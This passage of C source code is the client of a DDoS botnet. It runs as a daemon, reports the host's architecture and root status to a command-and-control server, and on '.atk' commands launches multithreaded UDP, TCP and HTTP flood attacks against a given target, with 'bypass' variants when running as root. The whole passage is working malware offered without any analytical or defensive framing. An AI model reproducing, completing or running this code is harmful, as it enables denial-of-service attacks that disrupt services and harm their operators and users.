    inet_pton(AF_INET, args->target, &target_addr.sin_addr);

    end_time = time(NULL) + args->duration;

    while (!should_stop && time(NULL) < end_time) {
        pthread_mutex_lock(&attack_mutex);
        if (!attack_running) {
            should_stop = 1;
            pthread_mutex_unlock(&attack_mutex);
            break;
        }
        pthread_mutex_unlock(&attack_mutex);

        build_http_request(http_request, args->host, args->path, sizeof(http_request), ua_counter++);
        
        int conn = socket(AF_INET, SOCK_STREAM, 0);
        if (conn >= 0) {
            int bufsize = 1024 * 1024 * 16;
            setsockopt(conn, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
            fcntl(conn, F_SETFL, O_NONBLOCK);
            connect(conn, (struct sockaddr *)&target_addr, sizeof(target_addr));
            send(conn, http_request, strlen(http_request), 0);
            close(conn);
            packets_sent++;
            bytes_sent += strlen(http_request);
            sent_count++;
        }
    }

    free(args);
    return NULL;
}

void stop_attack() {
    pthread_mutex_lock(&attack_mutex);
    attack_running = 0;
    pthread_mutex_unlock(&attack_mutex);
    
    sleep(1);
    
    if (current_attack.attack_thread) {
        pthread_join(current_attack.attack_thread, NULL);
        current_attack.attack_thread = 0;
    }
    
    memset(&current_attack, 0, sizeof(current_attack));
    
    send_to_cnc("ATTACK_STOPPED\n");
}

void start_attack(char *cmd) {
    char target[64];
    int port, duration, threads, pps, size, delay;
    char method[32];
    char host[128];
    char path[256];
    
    pthread_mutex_lock(&attack_mutex);
    if (attack_running) {
        pthread_mutex_unlock(&attack_mutex);
        stop_attack();
        sleep(1);
    } else {
        pthread_mutex_unlock(&attack_mutex);
    }
    
    int parsed = sscanf(cmd, ".atk %63s %d %d %31s %d %d %d %d",
                        target, &port, &duration, method, &threads, &pps, &size, &delay);
    
    if (parsed < 4) {
        send_to_cnc("ERROR: Invalid attack format\n");
        return;
    }
    
    if (parsed < 5) threads = DEFAULT_THREADS;
    if (parsed < 6) pps = DEFAULT_PPS;
    if (parsed < 7) size = DEFAULT_SIZE;
    if (parsed < 8) delay = DEFAULT_DELAY;
    
    if (threads > MAX_THREADS) threads = MAX_THREADS;
    if (size > 65507) size = 65507;
    if (size < 64) size = 64;
    
    if (!is_root) {
        if (strcasecmp(method, "udp-bypass") == 0) {
            strcpy(method, "udp");
        } else if (strcasecmp(method, "tcp-bypass") == 0) {
            strcpy(method, "tcp");
        } else if (strcasecmp(method, "http-bypass") == 0) {
            strcpy(method, "http");
        }
    }
    
    pthread_mutex_lock(&attack_mutex);
    attack_running = 1;
    packets_sent = 0;
    bytes_sent = 0;
    pthread_mutex_unlock(&attack_mutex);
    
    strcpy(current_attack.target, target);
    current_attack.port = port;
    current_attack.duration = duration;
    current_attack.packet_size = size;
    current_attack.threads = threads;
    current_attack.pps = pps;
    current_attack.delay = delay;
    current_attack.attack_running = 1;
    
    struct hostent *he = gethostbyname(target);
    if (he != NULL) {
        struct in_addr **addr_list = (struct in_addr **)he->h_addr_list;
        strcpy(current_attack.target, inet_ntoa(*addr_list[0]));
        strcpy(host, target);
    } else {
        strcpy(host, target);
    }
    
    strcpy(current_attack.host, host);
    strcpy(current_attack.path, "/");
    
    void *(*attack_func)(void *) = NULL;
    char actual_method[64];
    
    if (is_root) {
        if (strcasecmp(method, "udp-bypass") == 0) {
            attack_func = udp_bypass_flood;
            strcpy(actual_method, "udp-bypass");
        } else if (strcasecmp(method, "tcp-bypass") == 0) {
            attack_func = tcp_bypass_flood;
            strcpy(actual_method, "tcp-bypass");
        } else if (strcasecmp(method, "http-bypass") == 0) {
            attack_func = http_bypass_flood;
            strcpy(current_attack.path, "/");
            strcpy(actual_method, "http-bypass");
        } else if (strcasecmp(method, "udp") == 0) {
            attack_func = udp_flood;
            strcpy(actual_method, "udp");
        } else if (strcasecmp(method, "tcp") == 0) {
            attack_func = tcp_flood;
            strcpy(actual_method, "tcp");
        } else if (strcasecmp(method, "http") == 0) {
            attack_func = http_flood;
            strcpy(current_attack.path, "/");
            strcpy(actual_method, "http");
        } else {
            send_to_cnc("ERROR: Unknown method\n");
            pthread_mutex_lock(&attack_mutex);
            attack_running = 0;
            pthread_mutex_unlock(&attack_mutex);
            return;
        }
    } else {
        if (strcasecmp(method, "udp") == 0 || strcasecmp(method, "udp-bypass") == 0) {
            attack_func = udp_flood;
            strcpy(actual_method, "udp");
        } else if (strcasecmp(method, "tcp") == 0 || strcasecmp(method, "tcp-bypass") == 0) {
            attack_func = tcp_flood;
            strcpy(actual_method, "tcp");
        } else if (strcasecmp(method, "http") == 0 || strcasecmp(method, "http-bypass") == 0) {
            attack_func = http_flood;
            strcpy(current_attack.path, "/");
            strcpy(actual_method, "http");
        } else {
            send_to_cnc("ERROR: Unknown method\n");
            pthread_mutex_lock(&attack_mutex);
            attack_running = 0;
            pthread_mutex_unlock(&attack_mutex);
            return;
        }
    }
    
    if (threads > 1) {
        for (int i = 0; i < threads; i++) {
            attack_args_t *thread_arg = malloc(sizeof(attack_args_t));
            if (!thread_arg) continue;
            memcpy(thread_arg, &current_attack, sizeof(attack_args_t));
            thread_arg->thread_id = i;
            
            pthread_t thread;
            if (pthread_create(&thread, NULL, attack_func, thread_arg) != 0) {
                free(thread_arg);
                send_to_cnc("ERROR: Failed to start attack\n");
                pthread_mutex_lock(&attack_mutex);
                attack_running = 0;
                pthread_mutex_unlock(&attack_mutex);
                return;
            }
            pthread_detach(thread);
            
            if (i == 0) {
                current_attack.attack_thread = thread;
            }
        }
    } else {
        attack_args_t *thread_arg = malloc(sizeof(attack_args_t));
        if (!thread_arg) {
            send_to_cnc("ERROR: Out of memory\n");
            pthread_mutex_lock(&attack_mutex);
            attack_running = 0;
            pthread_mutex_unlock(&attack_mutex);
            return;
        }
        memcpy(thread_arg, &current_attack, sizeof(attack_args_t));
        thread_arg->thread_id = 0;
        
        if (pthread_create(&current_attack.attack_thread, NULL, attack_func, thread_arg) != 0) {
            free(thread_arg);
            send_to_cnc("ERROR: Failed to start attack\n");
            pthread_mutex_lock(&attack_mutex);
            attack_running = 0;
            pthread_mutex_unlock(&attack_mutex);
            return;
        }
        pthread_detach(current_attack.attack_thread);
    }
    
    char response[256];
    snprintf(response, sizeof(response), "ATTACK_STARTED:%s:%d:%d:%s:%d:root=%d\n",
             current_attack.target, current_attack.port, current_attack.duration,
             actual_method, threads, is_root);
    send_to_cnc(response);
}

void execute_command(char* cmd) {
    cmd = strtok(cmd, "\r\n");
    if (!cmd) return;
    
    if (strcmp(cmd, "PING") == 0) {
        send_to_cnc("PONG\n");
    }
    else if (strncmp(cmd, ".stop", 5) == 0) {
        stop_attack();
        send_to_cnc("STOPPED\n");
    }
    else if (strncmp(cmd, ".atk", 4) == 0) {
        start_attack(cmd);
    }
}

int connect_to_cnc() {
    struct sockaddr_in server_addr;
    
    pthread_mutex_lock(&sock_mutex);
    if (sock > 0) {
        close(sock);
        sock = -1;
    }
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        pthread_mutex_unlock(&sock_mutex);
        return -1;
    }
    
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(CNC_PORT);
    if (inet_pton(AF_INET, CNC_IP, &server_addr.sin_addr) <= 0) {
        close(sock);
        sock = -1;
        pthread_mutex_unlock(&sock_mutex);
        return -1;
    }
    
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        close(sock);
        sock = -1;
        pthread_mutex_unlock(&sock_mutex);
        return -1;
    }
    
    int flag = 1;
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(flag));
    
    char hbt[256];
    snprintf(hbt, sizeof(hbt), "HBT|%s|%s\n", arch, version);
    send(sock, hbt, strlen(hbt), 0);
    
    char info[512];
    snprintf(info, sizeof(info), "INFO:{\"arch\":\"%s\",\"version\":\"%s\",\"root\":%d}\n", arch, version, is_root);
    send(sock, info, strlen(info), 0);
    
    pthread_mutex_unlock(&sock_mutex);
    return 0;
}

void reconnect_loop() {
    fd_set readfds;
    struct timeval tv;
    char buffer[BUFFER_SIZE];
    int reconnect_attempts = 0;
    
    while (running) {
        if (sock < 0) {
            if (connect_to_cnc() < 0) {
                reconnect_attempts++;
                if (reconnect_attempts > 10) {
                    sleep(30);
                    reconnect_attempts = 0;
                } else {
                    sleep(5);
                }
                continue;
            }
            reconnect_attempts = 0;
        }
        
        FD_ZERO(&readfds);
        FD_SET(sock, &readfds);
        tv.tv_sec = 20;
        tv.tv_usec = 0;
        
        int activity = select(sock + 1, &readfds, NULL, NULL, &tv);
        
        if (activity < 0) {
            pthread_mutex_lock(&sock_mutex);
            close(sock);
            sock = -1;
            pthread_mutex_unlock(&sock_mutex);
            continue;
        }
        
        if (activity == 0) {
            char hbt[256];
            snprintf(hbt, sizeof(hbt), "HBT|%s|%s\n", arch, version);
            send_to_cnc(hbt);
            continue;
        }
        
        if (FD_ISSET(sock, &readfds)) {
            int bytes = recv(sock, buffer, sizeof(buffer) - 1, 0);
            if (bytes <= 0) {
                pthread_mutex_lock(&sock_mutex);
                close(sock);
                sock = -1;
                pthread_mutex_unlock(&sock_mutex);
                continue;
            }
            buffer[bytes] = '\0';
            
            char* line = strtok(buffer, "\n");
            while (line) {
                execute_command(line);
                line = strtok(NULL, "\n");
            }
        }
    }
}

int main() {
    daemonize();
    signal(SIGPIPE, SIG_IGN);
    srand(time(NULL) ^ getpid());
    get_arch();
    check_root();
    reconnect_loop();
    return 0;
}
